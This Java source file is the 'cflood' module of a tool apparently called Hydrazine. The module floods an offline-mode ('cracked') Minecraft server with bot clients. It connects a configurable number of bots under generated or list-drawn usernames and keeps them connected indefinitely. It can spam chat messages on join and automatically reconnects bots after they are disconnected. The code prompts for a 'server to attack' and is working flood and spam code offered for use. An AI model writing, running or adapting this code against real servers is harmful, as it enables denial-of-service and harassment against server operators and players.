package com.github.hydrazine.module.builtin;

import java.io.File;
import java.util.Random;

import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.event.session.DisconnectedEvent;
import org.spacehq.packetlib.event.session.PacketReceivedEvent;
import org.spacehq.packetlib.event.session.SessionAdapter;

import com.github.hydrazine.Hydrazine;
import com.github.hydrazine.minecraft.Authenticator;
import com.github.hydrazine.minecraft.Server;
import com.github.hydrazine.module.Module;
import com.github.hydrazine.module.ModuleSettings;
import com.github.hydrazine.util.ConnectionHelper;
import com.github.hydrazine.util.FileFactory;

/**
 * 
 * @author xTACTIXzZ
 *
 * Floods a cracked server with bots
 *
 */
public class CrackedFloodModule implements Module
{
	// Create new file where the configuration will be stored (Same folder as jar file)
	private File configFile = new File(ClassLoader.getSystemClassLoader().getResource(".").getPath() + ".module_" + getName() + ".conf");
	
	// Configuration settings are stored in here
	private ModuleSettings settings = new ModuleSettings(configFile);
	
	private Server server;
	
	@Override
	public String getName() 
	{
		return "cflood";
	}

	@Override
	public String getDescription() 
	{
		return "Floods a cracked server with bots.";
	}

	@Override
	public void start() 
	{
		// Load settings
		settings.load();
			
		if(!Hydrazine.settings.hasSetting("host") || Hydrazine.settings.getSetting("host") == null)
		{
			System.out.println(Hydrazine.errorPrefix + "You have to specify a server to attack (-h)");
			
			System.exit(1);
		}
		
		System.out.println(Hydrazine.infoPrefix + "Starting module \'" + getName() + "\'. Press CTRL + C to exit.");
		
		server = new Server(Hydrazine.settings.getSetting("host"), Integer.parseInt(Hydrazine.settings.getSetting("port")));
		
		int bots = 5;
		int delay = 1000;
		
		if(configFile.exists())
		{
			try
			{
				bots = Integer.parseInt(settings.getProperty("bots"));
				delay = Integer.parseInt(settings.getProperty("delay"));
			}
			catch(Exception e)
			{
				System.out.println(Hydrazine.errorPrefix + "Invalid value in configuration file. Reconfigure the module.");
			}
		}
		else
		{
			System.out.println(Hydrazine.warnPrefix + "This module hasn't been configured yet. Append the switch \'-c\' to the command to do so.");
			System.out.println(Hydrazine.warnPrefix + "Using default configuration. (5 bots; 1000ms delay)");
		}
		
		// Server has offline mode enabled
		if(Hydrazine.settings.hasSetting("username") || Hydrazine.settings.hasSetting("genuser"))
		{
			if(Hydrazine.settings.hasSetting("username"))
			{
				System.out.println(Hydrazine.infoPrefix + "You have only specified a single username. We need more in order to flood the server.");
				System.out.println(Hydrazine.infoPrefix + "Configure this module to load usernames from a file OR use the -gu switch.");
				
				stop();				
			}
			else
			{
				for(int i = 0; i < bots; i++)
				{
					String username = Authenticator.getUsername();
					
					MinecraftProtocol protocol = new MinecraftProtocol(username);
					
					Client client = ConnectionHelper.connect(protocol, server);
					
					registerListeners(client);
					
					try 
					{
						Thread.sleep(delay);
					} 
					catch (InterruptedException e) 
					{
						e.printStackTrace();
					}
				}
				
				// Do nothing, clients stay connected until program shuts down
				while(true)
				{
					try 
					{
						Thread.sleep(50);
					} 
					catch (InterruptedException e)
					{
						e.printStackTrace();
					}
				}
			}
		}
		// Load usernames from file
		else if(settings.containsKey("useUsersFromList") && Boolean.valueOf(settings.getProperty("useUsersFromList")))
		{
			if(settings.containsKey("userList") && !settings.getProperty("userList").isEmpty())
			{
				FileFactory ff = new FileFactory(new File(settings.getProperty("userList")));
				
				for(int i = 0; i < bots; i++)
				{
					String[] usernames = ff.getUsernames();
					
					if(usernames.length == 0)
					{
						System.out.println(Hydrazine.errorPrefix + "No usernames contained in file.");
						
						return;
					}
					
					Random r = new Random();
					
					String username = usernames[r.nextInt(usernames.length)];
					
					MinecraftProtocol protocol = new MinecraftProtocol(username);
					
					Client client = ConnectionHelper.connect(protocol, server);
					
					registerListeners(client);
					
					try 
					{
						Thread.sleep(delay);
					} 
					catch (InterruptedException e) 
					{
						e.printStackTrace();
					}
				}
				
				// Do nothing, clients stay connected until program shuts down
				while(true)
				{
					try 
					{
						Thread.sleep(50);
					} 
					catch (InterruptedException e)
					{
						e.printStackTrace();
					}
				}
			}
			else
			{
				System.out.println(Hydrazine.errorPrefix + "No usernames list specified. Configure module to do so.");
			}
		}
		// User forgot to pass the options
		else
		{
 			System.out.println(Hydrazine.errorPrefix + "No client option specified. Configure this module to load usernames from a file OR use the -gu switch.");
 		}
	}

	@Override
	public void stop()
	{
		System.out.println("Module finished. Goodbye!");
	}

	@Override
	public void configure()
	{		
		settings.setProperty("bots", ModuleSettings.askUser("How many bots should be connected to the server?"));
		settings.setProperty("delay", ModuleSettings.askUser("Delay between connection attempts: "));
		settings.setProperty("reconnect", String.valueOf(ModuleSettings.askUserYesNo("Reconnect bots after disconnect? (Only works with -gu)")));
		settings.setProperty("useUsersFromList", String.valueOf(ModuleSettings.askUserYesNo("Load usernames from a list?")));
		settings.setProperty("sendMessageOnJoin", String.valueOf(ModuleSettings.askUserYesNo("Send message on join?")));
		
		if(settings.getProperty("useUsersFromList").equals("true"))
		{
			settings.setProperty("userList", ModuleSettings.askUser("Usernames list file path:"));
		}
		else
		{
			settings.setProperty("userList", "");
		}
		
		if(settings.getProperty("sendMessageOnJoin").equals("true"))
		{
			settings.setProperty("messageJoin", ModuleSettings.askUser("Message:"));
			settings.setProperty("messageDelay", ModuleSettings.askUser("Time to wait before sending message:"));
			
			if(ModuleSettings.askUserYesNo("Send second message on join?"))
			{
				settings.setProperty("secondMessageJoin", ModuleSettings.askUser("Message:"));
			}
		}
		else
		{
			settings.setProperty("messageJoin", "");
		}
		
		// Create configuration file if not existing
		if(!configFile.exists())
		{
			boolean success = settings.createConfigFile();
			
			if(!success)
			{
				return;
			}
		}
		
		// Store configuration variables
		settings.store();
	}
	
	/*
	 * Register listeners
	 */
	private void registerListeners(Client client)
	{
		client.getSession().addListener(new SessionAdapter() 
		{
			@Override
			public void packetReceived(PacketReceivedEvent event) 
			{
			    if(event.getPacket() instanceof ServerJoinGamePacket) 
			    {
			        if(settings.containsKey("sendMessageOnJoin") && settings.containsKey("messageJoin"))
			        {
			        	if(!(settings.getProperty("messageJoin").isEmpty()))
			            {
			        		int delay = 1000;
			        		
			        		if(configFile.exists())
			        		{
			            		try
			            		{
			            			delay = Integer.parseInt(settings.getProperty("messageDelay"));
			            		}
			            		catch(Exception e)
			            		{
			            			System.out.println(Hydrazine.errorPrefix + "Invalid value in configuration file. Reconfigure the module.");
			            		}
			        		}
			        		
			        		try 
			        		{
			        			Thread.sleep(delay);
							} 
			        		catch (InterruptedException e) 
			        		{
			        			// Client got disconnected or smth else, do not print error
			        			
			        			return;
			        		}
			        		
			        		client.getSession().send(new ClientChatPacket(settings.getProperty("messageJoin")));
			        		
			        		if(settings.containsKey("secondMessageJoin") && !settings.getProperty("secondMessageJoin").isEmpty())
			        		{
			        			try 
				        		{
				        			Thread.sleep(delay);
								} 
				        		catch (InterruptedException e) 
				        		{
				        			return;
				        		}
			        			
			        			client.getSession().send(new ClientChatPacket(settings.getProperty("secondMessageJoin")));
			        		}
			            }
			        }
			    }
			}
			
			@Override
			public void disconnected(DisconnectedEvent event) 
			{
				if(!(event.getReason().contains("The server is full") || event.getReason().contains("Internal network exception")))
				{
					if(settings.containsKey("reconnect") && !(settings.getProperty("reconnect").isEmpty()))
					{
						if(settings.getProperty("reconnect").equals("true"))
						{						
							if(Hydrazine.settings.hasSetting("genuser"))
							{	
								String username = Authenticator.getUsername();
									
								MinecraftProtocol protocol = new MinecraftProtocol(username);
								
								Client client = ConnectionHelper.connect(protocol, server);
								
								registerListeners(client);
							}
						}
					}
				}
				else if(event.getReason().contains("Internal network exception"))
				{
					System.exit(1);
				}
			}
		});
	}
}